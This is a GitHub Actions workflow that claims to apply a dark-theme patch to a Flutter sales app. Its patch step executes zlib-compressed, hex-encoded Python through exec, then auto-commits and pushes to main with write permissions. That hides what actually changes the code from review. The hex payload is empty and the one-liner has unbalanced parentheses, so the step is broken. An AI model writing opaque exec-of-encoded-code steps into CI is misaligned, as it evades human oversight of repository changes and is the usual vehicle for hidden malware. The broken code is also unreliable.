name: Full dark theme patch

on:
  push:
    branches: [main]
    paths:
      - '.github/dark-theme-trigger'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: main
          fetch-depth: 0
      - name: Patch Flutter dark theme gaps
        run: python -c "import zlib; exec(zlib.decompress(bytes.fromhex(''))).decode())"
      - name: Commit patch
        run: |
          git config user.name "Nika Business Bot"
          git config user.email "actions@users.noreply.github.com"
          git add android_app/lib/screens/sales_screen.dart android_app/lib/screens/sales_history_screen.dart android_app/lib/screens/main_layout.dart
          if git diff --cached --quiet; then exit 0; fi
          git commit -m "Apply dark theme throughout sales UI"
          git push origin main
